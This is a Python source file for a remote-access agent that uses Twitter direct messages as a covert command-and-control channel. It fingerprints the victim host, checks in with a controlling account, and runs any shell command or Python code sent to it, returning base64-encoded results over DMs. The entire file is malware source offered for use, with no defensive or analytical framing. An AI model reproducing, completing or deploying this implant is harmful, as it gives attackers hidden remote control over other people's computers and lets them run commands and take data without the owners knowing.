

import tweepy
import os
import time
import ast
import base64
import subprocess
import _thread

from tweepy import OAuthHandler
from uuid import getnode as get_mac
from subprocess import Popen as popen
from subprocess import PIPE as pipe

global queue,agent_name,pause,api

mac_addr = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))
path = os.path.dirname(os.path.abspath(__file__))

# Lists and stuff
queue = [] # ids of posts to handle
open(path+"\\ignore.txt","a").close()
def ignore():
        try:
                with open(path+"\\ignore.txt","r") as idfile:
                        ids = idfile.read().split("\n")
                        idlist = []
                        for ID in ids:
                                if not ID == '':
                                        idlist.append(int(ID))
                        return idlist
        except:
                with open(path+"\\ignore.txt","w") as idfile: ignore()
def add_ignore(ID):
        if not ID in ignore():
                with open(path+"\\ignore.txt","a") as idfile:
                        idfile.write(str(ID)+"\n")
pause = 2


# Api setup
def setup_api():
        global api
        done = False
        while not done:
                try:
                        auth = OAuthHandler(consumer_key, consumer_secret)
                        auth.set_access_token(access_token, access_secret)
                        api = tweepy.API(auth,wait_on_rate_limit=True)
                        done = True
                except: print("[Error]: Couln't setup API")






# Formatting
def format_msg(msg):
        if not msg["command"] == False:
                command = msg["command"]
                cmd = format_cmd(command["type"],command["cmd"],command["get_result"],command["background"])
        encoded = base64.b64encode(str(msg).encode()).decode()
        encoded = "$c2$"+encoded+"$c2$"
        return encoded
def unformat_msg(msg):
        try:
                text = base64.b64decode(msg.encode()).decode()
                data = ast.literal_eval(text)
                if data["command"]:
                        data["command"] = unformat_cmd(data["command"])
                return data
        except Exception as e:
                print("[Error]: "+str(e))
                print("Message we were trying to handle:\n")
                print(msg)
def format_cmd(_type,cmd,get_result,background):
        data = {"type":_type, "cmd":cmd, "get_result":get_result, "background":background}
        encoded = base64.b64encode(str(data).encode()).decode()
        return encoded
def unformat_cmd(data):
                text = base64.b64decode(data.encode()).decode()
                if not text == False:
                        data = ast.literal_eval(text)
                else: data = False
                return data
def gen_agent_name():
        mac_chars = mac_addr.split(":")
        mac_short = mac_chars[0]+mac_chars[1]
        user = run_cmd("whoami")
        username = ''
        for char in list(user):
                if not len(username) == 4:
                        username += char
        return username+mac_short
def send_msg(msg):
        message = api.send_direct_message(server_name,text=msg)
        add_ignore(message.id)


# Commands and stuff
def run_cmd(cmd):
        if ' ' in cmd:
                if cmd.split(" ")[0].lower() == "cd":
                        newdir = cmd.split(" ")[1]
                        try:
                                os.chdir(newdir)
                                return newdir
                        except FileNotFoundError:
                                return "[Error]: FileNotFoundError"
        result = (popen(cmd,stdout=pipe,shell=True).communicate())[0].decode()
        if result == '':
                return "[blank/error]"
        else:
                return result
def run_bg(cmd):
        return subprocess.call(cmd,shell=True)
def run_py(code):
        try:
                exec(code)
                return None
        except Exception as e:
                return "[Error]: "+str(e)


# Checking and handling
def check_dms():
        dms = []
        while True:
                newdms = []
                for dm in api.direct_messages(full_text="true"):
                        if dm.sender_screen_name == server_name:
                                ID = dm.id
                                if not ID in ignore():
                                        if not ID in queue:
                                                queue.append(ID)
                time.sleep(pause)

def sort_queue():
        for ID in queue:
                message = api.get_direct_message(ID, tweet_mode='extended', full_text=True)
                handle_message(message)
                queue.remove(ID)
                add_ignore(ID)

def handle_message(message):
        global agent_name
        text = message.text
        if '$' in list(text):
                encoded = text.split('$c2$')[1]
                data = unformat_msg(encoded)
                if data["from"] == "server" and (data["to"] == agent_name or data["to"] == "all"):
                        handle(data)


def handle(data):
        _from = data["from"]
        to = data["to"]
        command = data["command"]
        result = data["result"]
        refresh = data["refresh"]
        if command:
                handle_command(command)
        msg = {"from":agent_name,"to":"server"}
        if refresh:
                msg["result"] = False
                msg["refresh"] = True
                msg["command"] = False
                send_msg((format_msg(msg)))

def handle_command(command):
        _type = command["type"]
        cmd = command["cmd"]
        res = command["get_result"]
        bg = command["background"]
        if _type == "shell":
                if not bg:
                        result = run_cmd(cmd)
                        if res:
                                msg = {"from":agent_name,"to":"server","command":False,"refresh":False}
                                msg["result"] = base64.b64encode(result.encode()).decode()
                                send_msg(format_msg(msg))
                                
        elif _type == "python":
                result = run_py(cmd)
                if res:
                        msg = {"from":agent_name,"to":"serevr","command":False,"refresh":False}
                        msg["result"] = base64.b64encode(result.encode()).decode()
                        send_msg(format_msg(msg))





# Startup functions
def start_polling():
        _thread.start_new_thread(check_dms, ())
        while True:
                sort_queue()
                time.sleep(pause)
def start_agent():
        global agent_name
        agent_name = gen_agent_name()
        setup_api()
        alive = {"from":agent_name,"to":"server","command":False,"result":False,"refresh":True}
        send_msg(format_msg(alive))
        start_polling()

try:
        start_agent()
except Exception as e: print("[Error]: "+str(e)); pass
